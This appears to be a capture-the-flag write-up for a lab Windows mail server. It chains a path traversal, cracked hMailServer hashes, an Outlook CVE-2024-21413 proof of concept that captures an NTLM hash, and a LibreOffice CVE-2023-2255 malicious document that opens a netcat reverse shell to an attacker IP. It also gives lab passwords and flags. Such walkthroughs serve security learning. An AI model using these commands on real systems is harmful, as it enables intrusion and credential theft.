# Mailing

## NMAP
```
PORT      STATE SERVICE
25/tcp    open  smtp
80/tcp    open  http
110/tcp   open  pop3
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
143/tcp   open  imap
445/tcp   open  microsoft-ds
465/tcp   open  smtps
587/tcp   open  submission
993/tcp   open  imaps
5040/tcp  open  unknown
5985/tcp  open  wsman
7680/tcp  open  pando-pub
47001/tcp open  winrm
```

```
PORT    STATE SERVICE       VERSION
25/tcp  open  smtp          hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp  open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://mailing.htb
110/tcp open  pop3          hMailServer pop3d
|_pop3-capabilities: USER UIDL TOP
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp open  imap          hMailServer imapd
|_imap-capabilities: IMAP4 QUOTA NAMESPACE completed RIGHTS=texkA0001 CAPABILITY ACL SORT CHILDREN IMAP4rev1 OK IDLE
445/tcp open  microsoft-ds?
465/tcp open  ssl/smtp      hMailServer smtpd
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
|_ssl-date: TLS randomness does not represent time
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
587/tcp open  smtp          hMailServer smtpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
993/tcp open  ssl/imap      hMailServer imapd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
|_imap-capabilities: IMAP4 QUOTA NAMESPACE completed RIGHTS=texkA0001 CAPABILITY ACL SORT CHILDREN IMAP4rev1 OK IDLE
Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows
```


## Foothold
- checking the webserver we have instructions to setup the mail server and send emails.
- we can send emails to: `maya@mailing.htb`, ` `, ` `
- the webserver has a file path traversal vuln at `download.php?file=`
```
[Directories]
ProgramFolder=C:\Program Files (x86)\hMailServer
DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
DataFolder=C:\Program Files (x86)\hMailServer\Data
LogFolder=C:\Program Files (x86)\hMailServer\Logs
TempFolder=C:\Program Files (x86)\hMailServer\Temp
EventFolder=C:\Program Files (x86)\hMailServer\Events
[GUILanguages]
ValidLanguages=english,swedish
[Security]
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
[Database]
Type=MSSQLCE
Username=
Password=0a9f8ad8bf896b501dde74f08efd7e4c
PasswordEncryption=1
Port=0
Server=
Database=hMailServer
Internal=1
```
- crack Administrator using crackstation - `homenetworkingadministrator`
- Using CVE-2024-21413 https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability/tree/main
- start the impact-smbserver
- send the payload
```
python CVE-2024-21413.py --server "mailing.htb" --port 587 --username "administrator@mailing.htb" --password "homenetworkingadministrator" --sender "administrator@mailing.htb" --recipient "maya@mailing.htb" --url "\\\\10.10.14.5\\share\\test.txt" --subject "Open this"

CVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC.
Alexander Hagenah / @xaitax / ah@primepage.de

âœ… Email sent successfully.
```
- received a hash
```
maya::MAILING:aaaaaaaaaaaaaaaa:3e19e8812f1120ddc1402d4c445fe99f:010100000000000000f8fc5f1666dc01f5e660f952069a1300000000010010004b00640058004a004c00770075006e00030010004b00640058004a004c00770075006e000200100048006d0045006c0053005900460064000400100048006d0045006c0053005900460064000700080000f8fc5f1666dc01060004000200000008003000300000000000000000000000002000001810cec2ad7c0216ac45e79b874f5f279b52c34b06ff7ee5ceb2604821a76d8a0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0035000000000000000000
```

- `john --wordlist=rockyou.txt maya.hash`
- `maya`:`m4y4ngs4ri`
- open evilwinrm to get user.txt - 29d92226e47153cdff2f09d3b7f814db

## Privilege Escalation
- nxc smb shows that we have READ, WRITE access to `Important Documents`
- upload a file to that folder and observe that the file gets deleted after a while.
- Program Files has `LibreOffice` version 7.4.0.1 - `\program\version.ini`
- https://github.com/elweth-sec/CVE-2023-2255
- `python3 CVE-2023-2255.py --cmd 'cmd.exe /c C:\temp\nc64.exe -e powershell 10.10.14.5 443' --output 'reverse.odt'`
- upload `reverse.odt` to `Important Documents` and `nc64.exe` to `C:\temp`
- start a nc listener at 443
- wait for a few minutes to get a reverse shell as localadmin to get the root.txt - c7535c63b5bd3ea7e3450f9f87814c83
